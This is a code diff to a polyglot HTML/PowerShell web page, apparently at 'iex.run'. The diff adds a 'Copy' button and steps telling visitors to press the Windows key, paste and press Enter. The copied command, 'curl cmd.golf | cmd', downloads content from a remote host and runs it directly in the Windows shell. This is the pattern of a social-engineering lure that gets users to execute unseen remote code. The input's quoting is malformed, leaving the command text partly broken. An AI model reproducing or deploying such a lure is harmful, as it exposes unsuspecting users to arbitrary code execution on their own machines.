@@ -1,10 +1,39 @@
 ### iex.run ### <br> <br> <!--
-# Powershell stuff goes below here
+############## Powershell stuff goes below here #########################
+# To avoid errors, don't leave any newlines without leading comments.
+#
+$ErrorActionPreference = 'Continue'
 $cmd = $myinvocation | Select MyCommand | Format-Table -hidetableheaders
 Write-Output $cmd
+#
+#
 $ErrorActionPreference = 'SilentlyContinue'
 break
-HTML stuff goes below here -->
+#################### HTML stuff goes below here ######################### -->
 
-Welcome to the site!
+<p>1. Click the 'Copy' button below.</p>
+
+<button onclick="myFunction()">Copy</button>
+<input type="text" value="cmd /c echo"> %tmp%\i & curl cmd.golf | cmd" id="myInput" readonly="">
+
+<p>2. Press the Windows Key on your keyboard. ( &#x229E ) </p>
+<p>3. Paste. (CTRL +V)</p>
+<p>4. Press Enter.</p>
+
+<p id="demo"></p>
+
+<script>
+function myFunction() {
+  var copyText = document.getElementById("myInput");
+  copyText.select();
+  copyText.setSelectionRange(0, 99999)
+  document.execCommand("copy");
+}
+document.getElementById("demo").innerHTML = 
+"Page hostname is: " + window.location.hostname;
+</script>
+
+
+
+</body></html>
 
